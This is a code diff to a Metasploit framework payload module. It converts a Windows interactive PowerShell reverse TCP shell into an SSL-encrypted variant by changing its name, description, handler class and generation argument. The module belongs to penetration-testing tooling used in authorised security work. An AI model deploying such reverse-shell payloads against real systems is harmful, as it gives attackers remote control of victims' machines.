@@ -14,8 +14,8 @@ module MetasploitModule
 
   def initialize(info = {})
     super(merge_info(info,
-      'Name'          => 'Windows Interactive Powershell Session, Reverse TCP',
-      'Description'   => 'Interacts with a powershell session on an established socket connection',
+      'Name'          => 'Windows Interactive Powershell Session, Reverse TCP SSL',
+      'Description'   => 'Interacts with a powershell session on an established SSL socket connection',
       'Author'        =>
         [
           'Ben Turner', # benpturner
@@ -28,7 +28,7 @@ module MetasploitModule
       'License'       => MSF_LICENSE,
       'Platform'      => 'windows',
       'Arch'          => ARCH_CMD,
-      'Handler'       => Msf::Handler::ReverseTcp,
+      'Handler'       => Msf::Handler::ReverseTcpSsl,
       'Session'       => Msf::Sessions::PowerShell,
       'RequiredCmd'   => 'generic',
       'Payload'       =>
@@ -44,6 +44,6 @@ module MetasploitModule
   end
 
   def generate
-    generate_powershell_code("Reverse")
+    generate_powershell_code("SSL")
   end
 end
